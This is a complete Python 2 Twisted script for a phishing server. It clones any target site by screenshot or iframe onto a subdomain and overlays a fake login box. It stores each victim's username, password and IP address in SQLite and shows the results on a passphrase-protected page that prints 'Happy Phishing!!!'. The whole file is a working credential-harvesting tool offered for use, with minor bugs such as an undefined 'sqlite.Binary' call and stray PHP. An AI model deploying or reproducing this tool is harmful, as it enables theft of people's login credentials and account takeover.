#!/usr/bin/env python

from twisted.web import resource
from twisted.web import server
from twisted.web.server import NOT_DONE_YET
from twisted.internet import reactor
from twisted.internet import protocol
from twisted.internet import defer
import re
import sqlite3
import random
import string
import base64
import subprocess
import os
import time
import sys

class MyPP(protocol.ProcessProtocol):
    def __init__(self, connection, sitename, outfile):
        self.conn = connection
        self.sitename = sitename
        self.outfile = outfile

    def connectionMade(self):
        self.pid = self.transport.pid

    def processEnded(self, reason):
        fin = open(self.outfile, "rb")
        data = fin.read()
        fin.close()
        os.remove(self.outfile)
        cursor = self.conn.cursor()
        cursor.execute('INSERT INTO images VALUES(CURRENT_TIMESTAMP,?,?)', (self.sitename,sqlite3.Binary(data),))
        self.conn.commit()
        return

class PhishDB():
    def __init__(self, sqlite_file="phishing.sqlite"):
        self.sqlite_file = sqlite_file
        self.conn = None
        if (not self.checkDB()):
            self.initDB()

    def getCursor(self):
        if (self.conn == None):
            self.conn = sqlite3.connect(self.sqlite_file)
        return self.conn.cursor()

    def checkDB(self):
        cursor = self.getCursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logs'")
        if cursor.fetchone() is None:
            return False

        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sites'")
        if cursor.fetchone() is None:
            return False

        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='images'")
        if cursor.fetchone() is None:
            return False
        return True

    def initDB(self):
        cursor = self.getCursor()
        cursor.execute("DROP TABLE IF EXISTS logs")
        cursor.execute("CREATE TABLE logs(date TEXT, site TEXT, ip TEXT, user TEXT, pass TEXT)")

        cursor.execute("DROP TABLE IF EXISTS sites")
        cursor.execute("CREATE TABLE sites(date TEXT, site TEXT, url TEXT, code TEXT)")

        cursor.execute("DROP TABLE IF EXISTS images")
        cursor.execute("CREATE TABLE images(date TEXT, site TEXT, image BLOB)")
        self.conn.commit()
        return

    def getResults(self, code):
        cursor = self.getCursor()
        sitename = self.getSiteName(code)
        if (sitename is None):
            return None
        cursor.execute('SELECT date, ip, user, pass FROM logs WHERE site=?', (sitename,))
        html = "<pre>\n";
        html += "[DATE], [IP], [USERNAME], [PASSWORD]\n";
        html += "------------------------------------\n";
        for row in cursor.fetchall():
            html += '%s, %s, %s, %s\n' % (row[0], row[1], row[2], row[3])
        html += "</pre>";

        return html

    def addSite(self, sitename, url):
        # insert site into db
        cursor = self.getCursor()
        code = ''.join(random.SystemRandom().choice(string.uppercase + string.lowercase + string.digits) for _ in xrange(20))
        cursor.execute('INSERT INTO sites VALUES(CURRENT_TIMESTAMP,?,?,?)', (sitename,url,code,))
        self.conn.commit()
        
        # attempt to screenshot the dest url
        self.screenCaptureWebSite(url, sitename, os.getcwd() + "/" + sitename + ".png")

        # return the site code
        return code

    def addLog(self, sitename, ip, username, password):
        cursor = self.getCursor()
        cursor.execute('INSERT INTO logs VALUES(CURRENT_TIMESTAMP,?,?,?,?)', (sitename,ip,username,password,))
        self.conn.commit()
        return

    def screenCaptureWebSite(self, url, sitename, outfile):
        pp = MyPP(self.conn, sitename, outfile)
        command = ['/usr/bin/phantomjs', '--ssl-protocol=any', '--ignore-ssl-errors=yes', os.getcwd() + '/libs/screencap.js', url,  outfile]
        reactor.spawnProcess(pp, command[0], command, {})
        return
        
    def addImage(self, sitename, image):
        cursor = self.getCursor()
        cursor.execute('INSERT INTO images VALUES(CURRENT_TIMESTAMP,?,?)', (sitename,sqlite.Binary(image),))
        self.conn.commit()
        return

    def getImage(self, sitename):
        cursor = self.getCursor()
        cursor.execute('SELECT image FROM images WHERE site=?', (sitename,))
        res = cursor.fetchone()
        if res is None:
            return None
        return base64.b64encode(res[0])
        
    def getSiteUrl(self, sitename):
        cursor = self.getCursor()
        cursor.execute('SELECT url FROM sites WHERE site=?', (sitename,))
        res = cursor.fetchone()
        if res is None:
            return None
        return res[0]

    def getSiteCode(self, sitename):
        cursor = self.getCursor()
        cursor.execute('SELECT code FROM sites WHERE site=?', (sitename,))
        res = cursor.fetchone()
        if res is None:
            return None
        return res[0]

    def getSiteName(self, code):
        cursor = self.getCursor()
        cursor.execute('SELECT site FROM sites WHERE code=?', (code,))
        res = cursor.fetchone()
        if res is None:
            return None
        return res[0]

    def getSites(self, domainname):
        cursor = self.getCursor()
        cursor.execute('SELECT site, url, code FROM sites')
        html = "<center><table><tr><td><b><u>Phishing URL</u></b></td><td><b><u>Source URL</u></b></td><td><b><u>Results URL</u></b></td></tr>";
        for row in cursor.fetchall():
            site = row[0]
            url = row[1]
            code = row[2]
            if (site is not None and url is not None and code is not None):
                html += '<tr><td><a href="http://'+site+'.'+domainname+'">http://'+site+'.'+domainname+'</a></td>'
                html += '<td><a href="'+url+'">'+url+'</a></td>'
                html += '<td><a href="http://www.'+domainname+'/view?c='+code+'">http://www.'+domainname+'/view?c='+code+'</a></td></tr>'
        html += "</table></center>"
        return html

# define standard error page
class errorPage(resource.Resource):
    def render_GET(self, request):
        return "<html><body><center><h1>An error has occured.  Please try again later.</h1></center></body></html>"

class TimedProcessProtocol(protocol.ProcessProtocol):
    def __init__(self, timeout):
        self.timeout = timeout

class PhishResource(resource.Resource):
    def __init__(self, domainname, logpath, logfile, reactor, passphrase, redirecturl="error"):
        self.domainname = domainname
        self.logpath = logpath
        self.logfile = logfile
        self.reactor = reactor
        self.passphrase = passphrase
        self.redirecturl = redirecturl
        self.db = PhishDB()
        resource.Resource.__init__(self)
 
    def render(self, request):
        subdomain = re.sub(r"\.%s$" % self.domainname, "", request.getRequestHostname())
        if (request.path == "/submit"):
            return self.captureCreds(request)
        elif ((subdomain == "" or subdomain == "www") and (request.path == "/view")):
            return self.viewResults(request)
        elif ((subdomain == "" or subdomain == "www") and (request.path == "/index" or request.path == "/")):
            return self.displayIndex(request)
        elif ((subdomain == "" or subdomain == "www") and (request.path == "/create")):
            return self.createSite(request)
        elif ((subdomain == "" or subdomain == "www") and (request.path == "/viewall")):
            return self.viewAllResults(request)
        else:
            if (self.doesSiteExist(subdomain)):
                return self.displaySite(subdomain)
            else:
                return self.displayIndex(request)

    def doesSiteExist(self, sitename):
        if (self.db.getSiteUrl(sitename) is None):
            return False
        return True

    def displayError(self, message):
        html = '<center><b><u>ERROR</u></b><br>'+message+'<br><br>Click <a href="http://www.'+self.domainname+'/index">HERE</a> to go back.</center>'
        return html.encode('ascii', 'ignore')

    def viewAllResults(self, request):
        passphrase = None
        try:
            passphrase = request.args["p"]
        except:
            pass
        if (passphrase is not None and passphrase[0] == self.passphrase):
            return self.db.getSites(self.domainname).encode('ascii', 'ignore')
        return self.displayIndex(request)

    def createSite(self, request):
        site = None
        url = None
        try:
            site = request.args["name"]
            url = request.args["url"]
        except:
            pass

        if (site is not None and url is not None) and (site[0] != "" and url[0] != ""):
            site = site[0]
            if (self.doesSiteExist(site)):
                return self.displayError("Phishing Site using that Site name already exists")
            url = url[0]
            code = self.db.addSite(site,url)
            html = '<center>'
            html += '<table>'
            html += '<tr>'
            html += '<td>'
            html += 'Source URL'
            html += '</td>'
            html += '<td>'
            html += '<a href="'+url+'">'+url+'</a>'
            html += '</td>'
            html += '</tr>'
            html += '<tr>'
            html += '<td>'
            html += 'Phishing URL'
            html += '</td>'
            html += '<td>'
            html += '<a href="http://'+site+'.'+self.domainname+'">http://'+site+'.'+self.domainname+'</a>'
            html += '</td>'
            html += '</tr>'
            html += '<tr>'
            html += '<td>'
            html += 'Log URL'
            html += '</td>'
            html += '<td>'
            html += '<a href="http://www.'+self.domainname+'/view?c='+code+'">http://www.'+self.domainname+'/view?c='+code+'</a>'
            html += '</td>'
            html += '</tr>'
            html += '</table>'
            html += '</center>'
            return html.encode('ascii', 'ignore')
        else:
            return self.displayError("Site name and Source URL can not be blank")

    def displayIndex(self, request):
        html = '<center>'
        html += '<form class="form-horizontal" action="http://www.'+self.domainname+'/create" method="GET">'
        html += '<table>'
        html += '<tr>'
        html += '<td>'
        html += '<label>Phishing Site Name </label>'
        html += '</td>'
        html += '<td>'
        html += '<input type="text" name="name">.'+self.domainname+'<br>'
        html += '</td>'
        html += '</tr>'
        html += '<tr>'
        html += '<td>'
        html += '<label>Source Site URL </label>'
        html += '</td>'
        html += '<td>'
        html += '<input type="text" name="url"> <i>(include http:// or https://)</i><br>'
        html += '</td>'
        html += '</tr>'
        html += '</table>'
        html += '<input type="submit" value="CREATE" />'
        html += '</form>'
        html += '</center>'
        return html.encode('ascii', 'ignore')

    def captureCreds(self, request):
        # log the credentials
        print("::%s:: %s,[CREDENTIALS],%s,%s" % (request.getRequestHostname(),time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])))
        sys.stdout.flush()
        self.db.addLog(request.args["n"][0],request.getClientIP(),request.args["u"][0],request.args["p"][0])
        # redirect to target URL
        request.redirect(self.redirecturl)
        request.finish()
        return NOT_DONE_YET

    def viewResults(self, request):
        code = None
        try:
            code = request.args["c"][0]
        except KeyError:
            # redirect to target URL
            request.redirect(self.redirecturl)
            request.finish()
            return NOT_DONE_YET
        if (self.db.getSiteName(code) is None):
            # redirect to target URL
            request.redirect(self.redirecturl)
            request.finish()
            return NOT_DONE_YET
        else:
            return self.db.getResults(code).encode('ascii', 'ignore')

    def displaySite(self, sitename):
        html = '<div id="back" style="max-width:100%; background-color: #111111; opacity: 0.65;'
        html += 'filter: alpha(opacity=65); position: absolute; z-index: 9000;'
        html += 'top: 0px; left: 0px; width: 100%; min-height: 100%; height: 2000px;">'
        image = self.db.getImage(sitename)
        if (image is None):
            html += '<iframe src="' + self.db.getSiteUrl(sitename) + '" style=" margin: 0px; padding: 0px; width: 100%; height: 2000px;" ></iframe>'
        else:
            html += '<img src="data:image/png;base64,' + image + '">'
        html += '</div>'
        html += '<div style="background-color: #111111; opacity: 0.65;'
        html += 'filter: alpha(opacity=65); position: absolute; z-index: 9000;'
        html += 'top: 0px; left: 0px; width: 100%; min-height: 100%; height: <? echo $height ?>px;"></div>'

        html += '<div id="login" style="padding: 16px; position: fixed; _position:absolute; top: 50%; left: 50%;'
        html += 'background-color: #eeeeee; margin-top: -100px; margin-left: -150px; width: 300px;'
        html += 'z-index: 10000; text-align: left; border: 2px solid #000000;">'
        html += '<p>Login to ' + self.db.getSiteUrl(sitename) + '.</p>'

        html += '<form action="http://' + sitename + "." + self.domainname + '/submit" method="POST">'
        html += '<input type="hidden" name="n" value="' + sitename + '">'
        html += '<table border="0" cellpadding="1" cellspacing="1">'

        html += '<tr><td>Username: </td>'
        html += '<td><input type="text" name="u" /></td></tr>'
        html += '<tr><td>Password: </td>'
        html += '<td><input type="password" name="p" /></td></tr>'
        html += '<tr><td colspan="2">'
        html += '<input type="submit" value="Login" /></td></tr>'
        html += '</table>'
        html += '</form>'
        html += '</div>'

        return html.encode('ascii', 'ignore')

if __name__ == "__main__":
    def usage():
        print "phish.py <phishing domain> <passphrase>"

    if len(sys.argv) != 3:
        usage()
        sys.exit(0)

    root = PhishResource(sys.argv[1], ".", "out", reactor, sys.argv[2])
    root.putChild('', root)
    root.putChild("error", errorPage())
    root.putChild("submit", root)
    root.putChild("view", root)
    root.putChild("viewall", root)
    root.putChild("create", root)
    root.putChild("index", root)
    site = server.Site(root)
    reactor.listenTCP(80, site)
    print "Happy Phishing!!!"
    print 
    print "Create new phishing sites at: http://www."+sys.argv[1]
    print "View all phishing sites at: http://www."+sys.argv[1]+"/viewall?p="+sys.argv[2]
    print
    print "Press Ctrl-C to stop the server"
    reactor.run()
